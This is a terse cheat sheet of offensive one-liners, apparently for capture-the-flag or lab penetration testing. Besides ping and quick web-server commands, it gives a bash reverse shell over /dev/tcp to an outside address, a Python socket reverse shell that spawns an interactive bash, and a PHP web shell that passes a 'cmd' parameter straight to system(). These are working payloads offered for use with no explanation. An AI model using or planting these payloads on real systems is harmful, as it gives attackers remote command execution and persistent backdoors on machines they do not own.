PoC
```bash
ping -c 3 <ip>
```

Open WebServer [Python]
```bash
python3 -m http.server <port>
```

Open WebServer [PHP]
```bash
php -S 0.0.0.0:<port>
```

Bash
```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'
```

Python But Bash
```sh
#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.56",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("bash")
```


Web Shell
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

